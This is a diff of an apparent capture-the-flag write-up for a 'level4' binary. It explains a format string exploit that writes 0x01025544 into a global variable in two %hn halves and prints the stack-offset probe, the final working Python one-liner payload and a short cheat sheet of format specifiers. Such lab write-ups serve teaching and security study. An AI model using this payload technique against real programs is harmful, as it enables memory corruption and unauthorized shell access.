@@ -1,10 +1,11 @@
-instead of writing a integer (4 bytes), we will write 2 short (2 bytes) with %hn
-
-we want to write 0x01025544 so 0x0102 (258 in decimal) at 0x08049812 (address of m plus 2 in high order bytes) and 0x5544 (21828 decimal) at 0x08049810 (address of m in low order bytes)
-
+same as the precedent level, its a format string exploit, we have to put the value 0x01025544 (16930116 in decimal) into the m global variable (address : 0x08049810)to get access to a shell, but this value is too big to be inserted in one time using the format specifier %n so we will fractionate it into two parts, instead of writing a integer (4 bytes), we will write 2 short (2 bytes) with %hn
+we want to write 0x01025544 so 0x0102 (258 in decimal) at 0x08049812 (address of m plus 2) and 0x5544 (21828 decimal) at 0x08049810 (address of m)
+we see that those two addresses are inserted at the 12th and 13th position on the stack with :
 python -c 'print "\x10\x98\x04\x08\x12\x98\x04\x08" + "%12$p %13$p"' | ./level4
-
+so the final exploit is :
 python -c 'print "\x10\x98\x04\x08\x12\x98\x04\x08%250x%13$hn%21570x%12$hn"' | ./level4
+
+format string exploit helpers :
 
 %...$x	switch elements
 %...x	padding data
